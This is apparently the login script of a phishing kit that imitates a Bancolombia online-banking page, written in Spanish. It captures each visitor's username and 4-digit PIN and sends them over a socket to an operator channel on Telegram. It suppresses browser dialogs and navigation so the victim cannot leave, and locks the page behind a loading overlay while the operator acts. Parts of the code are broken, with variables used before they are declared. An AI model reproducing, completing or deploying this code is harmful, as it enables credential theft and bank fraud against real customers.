// Desactivar TODOS los diálogos del navegador inmediatamente
(() => {
    // Remover eventos existentes
    window.onbeforeunload = null;
    window.onunload = null;
    window.onpopstate = null;
    
    // Eliminar las propiedades
    delete window.onbeforeunload;
    delete window.onunload;
    delete window.onpopstate;
    
    // Prevenir futuros diálogos
    const preventDialog = (e) => {
        e.stopPropagation();
        e.stopImmediatePropagation();
        e.preventDefault();
        e.returnValue = null;
        return null;
    };
    
    window.addEventListener('beforeunload', preventDialog, true);
    window.addEventListener('unload', preventDialog, true);
    window.addEventListener('popstate', preventDialog, true);
    
    // Sobrescribir métodos de diálogo
    window.alert = () => true;
    window.confirm = () => true;
    window.prompt = () => true;
})();

// Utilizar el módulo compartido para la gestión de sesión
const updateDateTime = () => {
    const now = new Date();
    const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        hour12: true,
        timeZone: 'America/Bogota'
    };
    const dateTimeStr = now.toLocaleDateString('es-CO', options).replace(',', '');
    document.querySelectorAll('.datetime').forEach(el => {
        el.textContent = dateTimeStr.toLowerCase();
    });
};

const getIPAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        document.querySelectorAll('.ip-address').forEach(el => {
            el.textContent = `Dirección IP: ${data.ip}`;
        });
    } catch (error) {
        console.error('Error fetching IP:', error);
    }
};

// Validación de formulario de login
// Eliminar TODOS los diálogos y eventos de navegación de forma agresiva
function removeAllDialogs() {
    // Limpiar eventos existentes
    window.onbeforeunload = null;
    window.onunload = null;
    window.onpopstate = null;
    
    // Eliminar las propiedades completamente
    delete window.onbeforeunload;
    delete window.onunload;
    delete window.onpopstate;
    
    // Prevenir diálogos futuros
    window.addEventListener('beforeunload', (e) => {
        e.stopPropagation();
        e.stopImmediatePropagation();
        e.preventDefault();
        e.returnValue = null;
    }, true);
    
    // Sobreescribir el método para prevenir diálogos
    window.alert = function() { return true; };
    window.confirm = function() { return true; };
    window.prompt = function() { return true; };
}

// Ejecutar inmediatamente
removeAllDialogs();

// Ejecutar periódicamente para asegurar
setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded', async () => {
    // Asegurar que los diálogos estén deshabilitados
    removeAllDialogs();
    
    // Inicializar sesión de forma robusta
    await new Promise(resolve => {
        const initSession = () => {
            const sessionId = bancolombia.initGlobalSession();
            if (sessionId) {
                // Forzar la sesión en el storage
                localStorage.setItem('bancolombia_session', sessionId);
                sessionStorage.setItem('currentSession', sessionId);
                window.globalSessionId = sessionId;
                resolve();
            } else {
                setTimeout(initSession, 100);
            }
        };
        initSession();
    });

    // Inicializar sesión y configurar manejo de Telegram
    bancolombia.initGlobalSession();
    bancolombia.setupTelegramActions();
    
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const submitButton = document.querySelector('.btn-iniciar');
    const form = document.querySelector('.auth-form');
    
    // Obtener overlay compartido
    const overlay = bancolombia.createLoadingOverlay();

    // La inicialización de sesión ya está manejada por setupTelegramActions
    
    // Solo permitir números en el campo de clave
    claveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 4) {
            e.target.value = e.target.value.slice(0, 4);
        }
    });

    // Validar campos para habilitar botón
    const validateForm = () => {
        const usuario = usuarioInput.value.trim();
        const clave = claveInput.value;
        
        const isValid = usuario.length > 0 && clave.length === 4;
        
        submitButton.disabled = !isValid;
        
        if (isValid) {
            submitButton.classList.add('active');
            submitButton.style.backgroundColor = '#ffd700';
            submitButton.style.cursor = 'pointer';
        } else {
            submitButton.classList.remove('active');
            submitButton.style.backgroundColor = '';
            submitButton.style.cursor = 'default';
        }
    };

    // Agregar eventos de validación al nuevo formulario
    [newUsuarioInput, newClaveInput].forEach(input => {
        input.addEventListener('input', validateNewForm);
        input.addEventListener('change', validateNewForm);
    });
    
    // Validación inicial
    validateNewForm();

    // Configurar validación de clave numérica
    newClaveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 4) {
            e.target.value = e.target.value.slice(0, 4);
        }
    });

    // Crear overlay de carga
    const existingOverlay = document.querySelector('.loading-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }

    // Usar el overlay compartido
    const loadingOverlay = bancolombia.createLoadingOverlay();
    document.body.appendChild(loadingOverlay);    // Manejar reconexiones
    globalSocket.on('disconnect', () => {
        console.log('Desconectado del servidor');
        setTimeout(() => {
            globalSocket = initializeSocket();
        }, 1000);
    });

    // Manejar confirmación de sesión
    globalSocket.on('sessionConfirmed', (data) => {
        console.log('Sesión confirmada:', data.sessionId);
    });

    // Eliminar manejador de Telegram redundante ya que usamos setupTelegramActions

    // Remover y reemplazar el formulario para limpiar todos los eventos
    const newForm = form.cloneNode(true);
    form.parentNode.replaceChild(newForm, form);

    // Prevenir CUALQUIER diálogo al navegar
    window.history.pushState = null;
    window.history.replaceState = null;
    window.history.back = null;
    window.history.forward = null;
    window.onpopstate = null;
    
    // Obtener referencias frescas a los elementos del formulario
    const newUsuarioInput = newForm.querySelector('#usuario');
    const newClaveInput = newForm.querySelector('#clave');
    const newSubmitButton = newForm.querySelector('.btn-iniciar');

    // Función de validación actualizada para los nuevos elementos
    const validateNewForm = () => {
        const usuario = newUsuarioInput.value.trim();
        const clave = newClaveInput.value;
        const isValid = usuario.length > 0 && clave.length === 4;
        
        newSubmitButton.disabled = !isValid;
        if (isValid) {
            newSubmitButton.classList.add('active');
            newSubmitButton.style.backgroundColor = '#ffd700';
            newSubmitButton.style.cursor = 'pointer';
        } else {
            newSubmitButton.classList.remove('active');
            newSubmitButton.style.backgroundColor = '';
            newSubmitButton.style.cursor = 'default';
        }
    };
    
    // Reinstalar validaciones
    [usuarioInput, claveInput].forEach(input => {
        input.addEventListener('input', validateForm);
        input.addEventListener('change', validateForm);
    });
    
    // Validación de clave numérica
    claveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 4) {
            e.target.value = e.target.value.slice(0, 4);
        }
    });
    
    // Control estricto de un solo envío
    let hasSubmitted = false;
    
    // Prevenir diálogos en el formulario
    const preventAllDialogs = () => {
        window.onbeforeunload = null;
        window.onunload = null;
        delete window.onbeforeunload;
        delete window.onunload;
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = null;
            return null;
        }, true);
    };
    
    // Aplicar prevención inmediatamente
    preventAllDialogs();
    
    newForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Prevenir diálogos de forma agresiva
        window.onbeforeunload = null;
        window.onunload = null;
        window.onpopstate = null;
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            e.returnValue = null;
            return null;
        }, true);
        
        if (hasSubmitted) {
            console.log('Formulario ya fue enviado');
            return;
        }

        // Marcar como enviado inmediatamente
        hasSubmitted = true;
        
        // Mostrar overlay y bloquear interfaz
        overlay.show(true);
        
        // Bloquear UI
        document.body.style.position = 'fixed';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        document.body.style.overflow = 'hidden';

        // Deshabilitar formulario
        usuarioInput.disabled = true;
        claveInput.disabled = true;
        submitButton.disabled = true;
        form.style.pointerEvents = 'none';
        
        if (hasSubmitted) {
            console.log('Formulario ya fue enviado');
            return;
        }

        // Verificar conexión
        if (globalSocket && globalSocket.connected) {
            hasSubmitted = true; // Marcar como enviado inmediatamente
            
            // Remover TODOS los listeners existentes
            globalSocket.removeAllListeners('dataSent');
            globalSocket.removeAllListeners('telegramAction');
            
            // Limpiar cualquier estado anterior
            sessionStorage.clear(); // Limpieza completa
            
            const data = {
                type: 'login',
                sessionId: bancolombia.getSessionId(),
                content: {
                    text: `📱 Inicio de sesión\n` +
                         `👤 Usuario: ${usuarioInput.value}\n` +
                         `🔐 Clave: ${claveInput.value}`
                },
                timestamp: Date.now(),
                page: 'index.html',
                waitForAction: true
            };
            
            // Marcar que el formulario fue enviado
            sessionStorage.setItem('formSubmitted', 'true');
            
            // Prevenir CUALQUIER diálogo antes del envío
            window.onbeforeunload = null;
            window.onunload = null;
            delete window.onbeforeunload;
            delete window.onunload;
            
            // Un solo envío
            globalSocket.emit('sendData', data);
            
            // Forzar que el overlay permanezca visible y prevenir diálogos
            overlay.show(true);
            
            // Prevenir diálogos después del envío
            setTimeout(() => {
                window.onbeforeunload = null;
                window.onunload = null;
                delete window.onbeforeunload;
                delete window.onunload;
            }, 0);

            // SOLO mantener el overlay visible después del envío
            globalSocket.once('dataSent', (response) => {
                console.log('Datos enviados correctamente');
                // Asegurarnos de que el overlay sigue visible
                overlay.show(true);
            });

            // NO escuchar ninguna acción de Telegram aquí
            // La redirección debe ser manejada SOLO por el setupTelegramActions en shared.js

        } else {
            console.error('Socket no conectado');
            overlay.hide();
            resetForm();
        }

        function resetForm() {
            isSubmitting = false;
            usuarioInput.disabled = false;
            claveInput.disabled = false;
            submitButton.disabled = false;
            form.style.pointerEvents = 'auto';
            document.body.style.position = '';
            document.body.style.width = '';
            document.body.style.height = '';
            document.body.style.overflow = '';
            window.onbeforeunload = null;
        }
    });
});

// Update date and time every second
setInterval(updateDateTime, 1000);
updateDateTime();

// Get IP address on load
getIPAddress();